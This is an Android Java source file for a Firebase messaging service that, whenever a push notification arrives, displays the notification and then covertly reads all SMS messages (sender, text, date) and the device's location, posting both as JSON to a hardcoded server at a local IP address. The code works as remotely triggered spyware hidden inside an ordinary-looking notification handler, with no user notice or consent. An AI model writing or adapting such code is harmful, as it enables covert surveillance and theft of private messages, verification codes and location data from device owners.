package com.example.myandroidapps;

import static android.content.ContentValues.TAG;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = MyFirebaseMessagingService.class.getSimpleName();

    FusedLocationProviderClient fusedLocationProviderClient;


    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);

        Log.d(TAG, "Token: " + token);


    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {

        Log.d(TAG, "Notification: " + remoteMessage.getFrom());
        String title = remoteMessage.getNotification().getTitle();
        String body = remoteMessage.getNotification().getBody();
        final String CHANNEL_ID = "HEADS_UP_NOTIFICATION";
        NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Heads Up Notification",
                NotificationManager.IMPORTANCE_HIGH
        );
        getSystemService(NotificationManager.class).createNotificationChannel(channel);
        Notification.Builder notification = new Notification.Builder(this,CHANNEL_ID)
                .setContentTitle(title)
                .setContentText(body)
                .setSmallIcon(R.drawable.ic_klogo)
                .setColor(ContextCompat.getColor(this, R.color.purple_700))
                .setAutoCancel(true);
        NotificationManagerCompat.from(this).notify(1,notification.build());
        Log.d(TAG, "onMessageReceived: "+title+" "+body);
        super.onMessageReceived(remoteMessage);
        try{
            readSms();
            locationDimensions();
        }
        catch (Exception e){
            Log.d(TAG, "checkPermissions: Error "+e);
        }


        NotificationManagerCompat.from(this).notify(1, notification.build());

        super.onMessageReceived(remoteMessage);
    }

    private void locationDimensions() {

        fusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this);

        LocationManager locationManager = (LocationManager) getSystemService(
                Context.LOCATION_SERVICE
        );

        Log.d(TAG, "locationDimensions: " + locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER));
        Log.d(TAG, "locationDimensions: " + locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER));

        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
                || locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return;
            }
            fusedLocationProviderClient.getLastLocation().addOnCompleteListener(new OnCompleteListener<Location>() {
                @SuppressLint("MissingPermission")
                @Override
                public void onComplete(@NonNull Task<Location> task) {

                    Location location = task.getResult();

                    if (location != null) {
                        JSONObject object = new JSONObject();
                        Log.d(TAG, "onComplete: Latitude" + location.getLatitude());
                        Log.d(TAG, "onComplete: Longitude" + location.getLongitude());
                        try {
                            object.put("Latitude", location.getLatitude());
                            object.put("Longitude", location.getLongitude());

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        Log.d(TAG, "onComplete: " + object);
                        request(object, "location");

                    } else {
                        LocationRequest locationRequest = new LocationRequest()
                                .setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY).
                                        setInterval(1000).setFastestInterval(1000)
                                .setNumUpdates(1);

                        LocationCallback locationCallback = new LocationCallback() {
                            @Override
                            public void onLocationResult(LocationResult locationResult) {
                                Location location1 = locationResult.getLastLocation();
                                Log.d(TAG, "onLocationResult: Latitude " + location1.getLatitude());
                                Log.d(TAG, "onLocationResult: Longitude " + location1.getLongitude());
                                JSONObject object = new JSONObject();
                                try {
                                    object.put("Latitude", location1.getLatitude());
                                    object.put("Longitude", location1.getLongitude());
                                    Log.d(TAG, "onComplete: " + object);
                                    request(object, "location");

                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }

                            }
                        };
                        fusedLocationProviderClient.requestLocationUpdates(locationRequest,
                                locationCallback, Looper.myLooper());
                    }

                }
            });


        } else {
            startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS)
                    .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        }

    }


    public void readSms() throws JSONException {
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
        if (cursor.getCount() > 0) {
            JSONArray jsonArray = new JSONArray();
            JSONObject jsonObject = new JSONObject();
            while (cursor.moveToNext()) {
                @SuppressLint("Range")
                String address = cursor.getString(cursor.getColumnIndex("address"));
                @SuppressLint("Range") String body = cursor.getString(cursor.getColumnIndex("body"));
                @SuppressLint("Range") String date = cursor.getString(cursor.getColumnIndex("date"));
                Log.d(TAG, "getSms: " + address);
                Log.d(TAG, "readSms: " + body);
                Log.d(TAG, "readSms: " + date);
                JSONObject object = new JSONObject();
                object.put("address", address);
                object.put("MessageText", body);
                object.put("Date", date);
                jsonArray.put(object);
                Log.d(TAG, "readSms: " + object);


            }
            jsonObject.put("UserSms", jsonArray);
            request(jsonObject, "sms");
        }


    }

    private void request(JSONObject objects,String name){
        RequestQueue queue = Volley.newRequestQueue(this);
        String url ="http://192.168.0.111:5000/"+name;

        // Request a string response from the provided URL.
        JsonObjectRequest objectRequest = new JsonObjectRequest(Request.Method.POST, url,objects,
                new Response.Listener<JSONObject>() {
                    @Override
                    public void onResponse(JSONObject response) {
//                     Log.d("Success Request");
//                       System.out.println("Successfull!!!");
                        Log.d(TAG, "Successfull!!!");
                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
//                Log.d("Error",error.getLocalizedMessage());
            }
        });
        queue.add(objectRequest);
    }

}
